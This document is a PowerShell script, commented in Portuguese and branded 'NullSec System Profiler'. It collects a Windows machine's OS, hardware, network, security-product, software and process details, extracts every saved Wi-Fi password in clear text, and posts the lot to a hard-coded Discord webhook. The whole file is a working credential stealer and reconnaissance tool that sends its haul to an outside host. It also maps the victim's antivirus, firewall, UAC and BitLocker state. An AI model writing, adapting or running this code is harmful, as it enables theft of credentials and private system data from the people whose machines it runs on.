# SYSTEM-PROFILER.ps1
# Coleta informações do sistema e envia para Discord via webhook

$WebhookURL = "https://discord.com/api/webhooks/1527718727204999299/nVc21-8bK1MfgI1Ybw5hZYG3KU0xuEZZalMATPdxY-jJFizPZn_sZiObl0UEUaGRRMdA"

# --- FUNÇÃO PARA CORTAR TEXTO LONGO (limite do embed) ---
function Truncate-Text {
    param([string]$Text, [int]$MaxLength = 1000)
    if ($Text.Length -gt $MaxLength) {
        return $Text.Substring(0, $MaxLength - 3) + "..."
    }
    return $Text
}

# --- COLETA DE DADOS ---

# 1. OS
$os = Get-CimInstance Win32_OperatingSystem
$OSInfo = "**$($os.Caption)**`n"
$OSInfo += "Versão: $($os.Version) | Build: $($os.BuildNumber)`n"
$OSInfo += "Arquitetura: $($os.OSArchitecture)`n"
$OSInfo += "Instalação: $($os.InstallDate)`n"
$OSInfo += "Último Boot: $($os.LastBootUpTime)"

# 2. Hardware
$cpu = Get-CimInstance Win32_Processor
$ram = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
$disk = Get-CimInstance Win32_DiskDrive | ForEach-Object { "$($_.Model) - $([math]::Round($_.Size/1GB,1)) GB" }
$gpu = Get-CimInstance Win32_VideoController
$HardwareInfo = "**CPU:** $($cpu.Name) ($($cpu.NumberOfCores) cores)`n"
$HardwareInfo += "**RAM:** $([math]::Round($ram.Sum/1GB,2)) GB`n"
$HardwareInfo += "**Discos:** $($disk -join ', ')`n"
$HardwareInfo += "**GPU:** $($gpu.Name)"

# 3. Network
$ips = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | ForEach-Object { "$($_.IPAddress)/$($_.PrefixLength) ($($_.InterfaceAlias))" }
$gateway = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue).NextHop
$dns = Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -ExpandProperty ServerAddresses -Unique
$publicIP = (Invoke-WebRequest -Uri 'https://api.ipify.org' -UseBasicParsing -TimeoutSec 5).Content
$wifiProfiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }
$wifiDetails = @()
foreach ($p in $wifiProfiles) {
    try {
        $key = netsh wlan show profile name="$p" key=clear | Select-String 'Key Content' | ForEach-Object { ($_ -split ':')[1].Trim() }
        $wifiDetails += "$p : $key"
    } catch {}
}
$NetworkInfo = "**IPs:** $($ips -join ', ')`n"
$NetworkInfo += "**Gateway:** $gateway`n"
$NetworkInfo += "**DNS:** $($dns -join ', ')`n"
$NetworkInfo += "**IP Público:** $publicIP`n"
$NetworkInfo += "**WiFi (com senhas):** $($wifiDetails -join '; ')"

# 4. Security
$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue
$fw = Get-NetFirewallProfile | ForEach-Object { "$($_.Name):$($_.Enabled)" }
$uac = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
$bitlocker = (Get-BitLockerVolume -MountPoint C: -ErrorAction SilentlyContinue).ProtectionStatus
$SecurityInfo = "**Antivírus:** $($av.displayName -join ', ')`n"
$SecurityInfo += "**Firewall:** $($fw -join ', ')`n"
$SecurityInfo += "**UAC:** $uac`n"
$SecurityInfo += "**BitLocker:** $bitlocker"

# 5. Software (Top 30 recentes)
$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Where-Object { $_.DisplayName } | 
    Sort-Object InstallDate -Descending | 
    Select-Object -First 30 | 
    ForEach-Object { "$($_.DisplayName) v$($_.DisplayVersion)" }
$SoftwareInfo = $software -join "`n"

# 6. Processos (Top 15 por uso de CPU)
$processes = Get-Process | 
    Sort-Object CPU -Descending | 
    Select-Object -First 15 | 
    ForEach-Object { "$($_.ProcessName) - $([math]::Round($_.CPU,1))% CPU (PID: $($_.Id))" }
$ProcessInfo = $processes -join "`n"

# --- MONTA O EMBED ---
$embed = @{
    title = "🖥️ NullSec System Profiler"
    color = 0x00ff00
    timestamp = (Get-Date -Format "yyyy-MM-ddTHH:mm:ss.fffZ")
    fields = @(
        @{ name = "🖥️ OS"; value = (Truncate-Text $OSInfo 1000); inline = $false },
        @{ name = "⚙️ Hardware"; value = (Truncate-Text $HardwareInfo 1000); inline = $false },
        @{ name = "🌐 Network"; value = (Truncate-Text $NetworkInfo 1000); inline = $false },
        @{ name = "🔒 Security"; value = (Truncate-Text $SecurityInfo 1000); inline = $false },
        @{ name = "📦 Software (Top 30 Recentes)"; value = (Truncate-Text $SoftwareInfo 1000); inline = $false },
        @{ name = "⚡ Processos (Top 15 CPU)"; value = (Truncate-Text $ProcessInfo 1000); inline = $false }
    )
}

$payload = @{
    embeds = @($embed)
} | ConvertTo-Json -Depth 10

# --- ENVIA PARA O DISCORD ---
try {
    Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $payload -ContentType "application/json"
} catch {
    # Se falhar, salva localmente como fallback (opcional)
    $errorMsg = "Falha ao enviar para Discord: $_"
    $errorMsg | Out-File "$env:TEMP\system_profile_error.txt"
}
